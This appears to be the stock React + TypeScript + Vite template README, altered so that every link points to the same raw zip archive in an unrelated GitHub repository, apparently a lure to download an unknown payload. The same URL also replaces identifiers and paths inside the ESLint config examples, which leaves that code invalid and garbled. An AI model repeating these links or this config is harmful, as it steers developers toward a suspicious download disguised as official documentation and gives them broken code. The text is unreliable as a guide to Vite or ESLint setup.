# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip) uses [Babel](https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip) (or [oxc](https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip) when used in [rolldown-vite](https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip)) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip) uses [SWC](https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip) for Fast Refresh

## React Compiler

The React Compiler is not enabled on this template because of its impact on dev & build performances. To add it, see [this documentation](https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip).

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:

```js
export default defineConfig([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...

      // Remove https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip and replace with this
      https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip,
      // Alternatively, use this for stricter rules
      https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip,
      // Optionally, add this for stylistic rules
      https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip,

      // Other configs...
    ],
    languageOptions: {
      parserOptions: {
        project: ['https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip', 'https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip'],
        tsconfigRootDir: https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip,
      },
      // other options...
    },
  },
])
```

You can also install [eslint-plugin-react-x](https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip) and [eslint-plugin-react-dom](https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip) for React-specific lint rules:

```js
// https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip
import reactX from 'eslint-plugin-react-x'
import reactDom from 'eslint-plugin-react-dom'

export default defineConfig([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...
      // Enable lint rules for React
      https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip['recommended-typescript'],
      // Enable lint rules for React DOM
      https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip,
    ],
    languageOptions: {
      parserOptions: {
        project: ['https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip', 'https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip'],
        tsconfigRootDir: https://github.com/jimly1/project-frame/raw/refs/heads/master/src/assets/project_frame_2.7.zip,
      },
      // other options...
    },
  },
])
```
